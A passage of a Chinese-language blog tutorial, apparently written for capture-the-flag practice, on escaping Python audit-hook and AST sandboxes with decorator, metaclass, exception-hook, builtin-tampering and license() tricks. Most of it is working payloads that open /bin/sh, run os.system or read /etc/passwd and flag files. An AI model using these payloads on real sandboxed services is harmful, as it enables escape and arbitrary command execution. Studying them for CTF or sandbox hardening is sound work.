<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<p>结合上面的 <code>__loader__.load_module(fullname)</code> 可以得到最终的 payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<p><strong>个人理解不同的python版本应该可能还是需要改一改payload。</strong></p>
<h6 id="篡改内置函数"><a href="#篡改内置函数" class="headerlink" title="篡改内置函数"></a>篡改内置函数</h6><p>这道audit hook 题还有其他解法，可以看到白名单是通过set 函数返回的，set作为一个内置函数实际上也是可以修改的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>比如我们将 set 函数修改为固定返回一个包含了 os.system 函数的列表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这样 set 函数会固定返回带有 os.system 的列表.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>最终 payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 篡改函数</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>解析一下payload:</strong></p>
<p>在Python中<strong>，<code>globals()</code>函数是一个内置函数，它返回一个表示当前全局符号表的字典，我们可以用它来访问、修改当前全局变量</strong>。所谓的全局符号表，就是一个存储了当前模块所有变量名和对应值的字典。</p>
<p><strong>这个payload通过<code>globals()</code>函数访问全局符号表，然后通过<code>&#39;__builtins__&#39;</code>关键字获取了内置名字空间，这个名字空间包含了Python的所有内置函数和变量</strong>。然后，它把<code>set</code>函数替换为一个lambda表达式，这个表达式总是返回一个固定的列表。<strong>这就意味着在执行这个payload之后，调用<code>set()</code>函数将不再执行原有的集合操作，而是会返回一个包含了几个特定字符串的列表。</strong></p>
<p>然后，它导入<code>os</code>模块，并调用<code>os.system(&#39;cat flag2.txt&#39;)</code>。这行代码会执行一个系统命令<code>cat flag2.txt</code>，并打印出<code>flag2.txt</code>文件的内容。</p>
<p>还有就是白名单明明没有<code>import</code>，为什么这里还是可以使用Import呢，原因如下：</p>
<p>请注意，这里的白名单是用来对某些可能的行为或操作进行限制的，比如<code>&#39;builtins.input&#39;</code>、<code>&#39;builtins.input/result&#39;</code>、<code>&#39;exec&#39;</code>和<code>&#39;compile&#39;</code>。然而<strong>“import”属于Python语法的一部分</strong>，<u>不是一个可以被调用的函数或方法</u>，因此它不会被包含在这种类型的白名单中。</p>
<p>有点问题，<code>__import__(&#39;ctypes&#39;)</code>确实报错了，但是<code>__import__(&#39;os&#39;)</code>却没有报错。——————个人理解为<code>os</code>为内置模块，同样的<code>import</code>也是属于内建函数。而<code>ctypes</code>不是内建模块，故报错</p>
<h4 id="绕过-AST-沙箱"><a href="#绕过-AST-沙箱" class="headerlink" title="绕过 AST 沙箱"></a>绕过 AST 沙箱</h4><p>AST沙箱会将用户的输入转化为操作码，此时字符串层面的变换基本上没用了，一般求你概况下考虑绕过AST黑名单，例如下面的沙箱禁止了 ast.Import|ast.ImportFrom|ast.Call 这三类操作, 这样一来就无法导入模块和执行函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure>

<h5 id="without-call"><a href="#without-call" class="headerlink" title="without call"></a>without call</h5><p>如果基于AST的沙箱限制了执行函数，那么就需要找到一种不需要执行函数的方式执行系统命令。</p>
<h6 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h6><p>利用的payload如下，该payload实际上等效于<code>exec(input(X))</code> ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>传入上述代码后，Python会打开输入，此时我们再输入payload就可以成功执行命令。（结合上面的沙箱的题，可以直接这样输入，具体情况具体分析，看是否需要写成一行）</p>
<p>同理，构造的方法有很多，比如<strong>使用单层的装饰器</strong>，打开help 函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@help</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>再输入 !sh即可打开<code>/bin/sh</code></p>
<p>或是给装饰器加一些参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_wrapper</span>(<span class="params">f</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@getattr(<span class="params">os,<span class="string">&quot;system&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@fake_wrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">something</span>():</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>相当于：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(os,<span class="string">&quot;system&quot;</span>)(fake_wrapper(something))</span><br></pre></td></tr></table></figure>

<p>这样就可以直接进入交互模式</p>
<p>亦或者自定义一个装饰器：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_wrapper</span>(<span class="params">f</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@os.system</span></span><br><span class="line"><span class="meta">@fake_wrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">something</span>():</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>相当于 os.system(fake_wrapper(something))，也就是 os.system(‘&#x2F;bin&#x2F;sh’)</p>
<h6 id="函数覆盖"><a href="#函数覆盖" class="headerlink" title="函数覆盖"></a>函数覆盖</h6><p>我们可以知道在Python中获取一个的属性例如<code>obj[argument]</code>实际上可以调用的是<code>obj.__getitem__(argument)</code>方法，因此只需要覆盖其<code>__getitem__</code>方法执行代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">class A:</span></span><br><span class="line"><span class="string">   __getitem__ = exec</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A()[&#x27;__import__(\&quot;os\&quot;).system(\&quot;dir\&quot;)&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(c)</span><br><span class="line"></span><br><span class="line">命令解读：</span><br><span class="line">创建了一个A的实例，并且试图访问其索引<span class="string">&#x27;__import__(\&quot;os\&quot;).system(\&quot;dir\&quot;)&#x27;</span>。在这个过程中，__getitem__方法（即<span class="built_in">exec</span>函数）被调用，并接收<span class="string">&#x27;__import__(\&quot;os\&quot;).system(\&quot;dir\&quot;)&#x27;</span>作为参数，所以你实际上执行了<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)，成功运行了<span class="built_in">dir</span>命令。</span><br></pre></td></tr></table></figure>

<p>本地测试代码如上确实成功执行，但是注意，这里调用了 A 的构造函数，因此AST中还是会出现 ast.Call，那么如何在不执行构造函数的情况下获取类实例呢</p>
<p><strong>（1）metaclass 利用</strong></p>
<p>Python中提供了一种元类(metaclass)的概念。元类是创建类的“类”。在Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p>
<p>元类在Python中的作用主要是用来创建类。类是对象的模版，而元类则是类的模版。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p>
<p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __getitem__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub[<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>除了 <code>__getitem__</code> 之外其他方法的利用方式如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__sub__ (k - <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mul__ (k * <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__floordiv__ (k // <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__truediv__ (k / <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mod__ (k % <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__pow__ (k**<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__lt__ (k &lt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__le__ (k &lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__eq__ (k == <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ne__ (k != <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ge__ (k &gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__gt__ (k &gt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iadd__ (k += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__isub__ (k -= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__imul__ (k *= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ifloordiv__ (k //= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__idiv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__itruediv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>) (Note that this only works when <span class="keyword">from</span> __future__ <span class="keyword">import</span> division <span class="keyword">is</span> <span class="keyword">in</span> effect.)</span><br><span class="line">__imod__ (k %= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ipow__ (k **= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ilshift__ (k&lt;&lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__irshift__ (k &gt;&gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iand__ (k = <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ior__ (k |= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ixor__ (k ^= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>示例:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __sub__ = <span class="built_in">exec</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub-<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>（2）exceptions利用</strong></p>
<p>利用 exceptions 的目的也是为了绕过显示地实例化一个类，如果一个类继承了Exception类，那么就可以通过raise 关键字来实例化，payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">raise</span> RCE </span><br><span class="line"></span><br><span class="line">代码解析：</span><br><span class="line">当 RCE 对象被创建的时候，python 会调用 __init__ 方法。</span><br><span class="line">在 __init__ 方法中，用语句 self += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>，试图在 self 上执行 += 操作。在 Python 中，+= 实际上是调用了对象的 __iadd__ 魔术方法。这个方法定义了当对象进行原地加法（<span class="keyword">in</span>-place addition）操作的时候应该做什么。</span><br><span class="line">在你的代码里，__iadd__ 方法被定义成了 <span class="built_in">exec</span> 函数。<span class="built_in">exec</span> 函数能接受一个字符串参数，然后解析并执行这个字符串作为 Python 代码。所以，当 self += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span> 被执行的时候，实际上是调用了 <span class="built_in">exec</span>(<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>raise 会进入 RCE 的 <code>__init__</code>, 然后触发 <code>__iadd__</code> 也就是 exec.</p>
<p>当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c</span>):</span><br><span class="line">        self += <span class="string">&quot;os.system(&#x27;sh&#x27;)&quot;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span></span><br><span class="line">sys.excepthook = X</span><br><span class="line"><span class="number">1</span>/<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>():</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, e</span>):</span><br><span class="line">    self += <span class="string">&quot;print(open(&#x27;flag&#x27;).read())&quot;</span></span><br><span class="line">  __iadd__ = <span class="built_in">eval</span></span><br><span class="line">__builtins__.<span class="built_in">__import__</span> = X</span><br><span class="line">&#123;&#125;[<span class="number">1337</span>]</span><br></pre></td></tr></table></figure>

<p>这个 payload 将 <code>__import__</code> 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 <code>__import__</code>.</p>
<h5 id="通过-license函数读取文件"><a href="#通过-license函数读取文件" class="headerlink" title="通过 license函数读取文件"></a>通过 license函数读取文件</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> self, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>上面的 payload 修改内建函数 license 的文件名列表为 &#x2F;etc&#x2F;passwd 当调用 <code>license()</code> 时会打印这个文件的内容.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&#x27;__builtins__.__dict__[&quot;license&quot;]._Printer__filenames&#x27;</span>))</span><br><span class="line">[<span class="string">&#x27;D:\\python\\python38\\lib\\..\\LICENSE.txt&#x27;</span>, <span class="string">&#x27;D:\\python\\python38\\lib\\..\\LICENSE&#x27;</span>, <span class="string">&#x27;D:\\python\\python38\\lib\\LICENSE.txt&#x27;</span>, <span class="string">&#x27;D:\\python\\python38\\lib\\LICENSE&#x27;</span>, <span class="string">&#x27;.\\LICENSE.txt&#x27;</span>, <span class="string">&#x27;.\\LICENSE&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>payload 中将 help 类的 <code>__enter__</code> 方法覆盖为 <code>license</code> 方法, 而 with 语句在创建上下文时会调用 help 的<code>__enter__</code>, 从而执行 <code>license</code> 方法. 这里的 help 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的. 例如:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyContext</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = MyContext()</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> self, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="绕过-ast-Attribute-获取属性"><a href="#绕过-ast-Attribute-获取属性" class="headerlink" title="绕过 ast.Attribute 获取属性"></a>绕过 ast.Attribute 获取属性</h5><p>python 3.10 中引入了一个新的特性：match&#x2F;case，类似其他语言中的 switch&#x2F;case，但 match&#x2F;case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。比如对于基本类型的匹配：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">item = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;One&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Two&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Two</span></span><br><span class="line">或</span><br><span class="line">item = (<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> (x, y, z):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span> <span class="subst">&#123;z&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> (x, y):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> (x,):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>匹配类的示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.thing = value</span><br><span class="line"></span><br><span class="line">item = AClass(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> AClass(thing=x):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Got <span 